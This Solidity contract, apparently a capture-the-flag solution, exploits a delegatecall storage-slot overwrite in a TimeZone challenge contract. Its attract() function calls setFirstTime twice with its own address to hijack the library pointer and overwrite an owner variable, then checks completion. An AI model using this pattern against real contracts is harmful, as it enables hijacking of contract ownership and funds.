pragma solidity ^0.6.0;
import "./1.sol";
contract Attract{
    uint256 s;
    address public time;
    address public me;
    address public check;
    constructor(address addr) public {
        time = address(Check(addr).timeZone());
        check = addr;
    }
    function attract() public{
        TimeZone(time).setFirstTime(uint256(uint160(address(this))));
        TimeZone(time).setFirstTime(uint256(uint160(address(this))));
        Check(check).isCompleted();
        
    }
    function setTime(uint256 _addr) public {
        me = address(_addr);
    }

}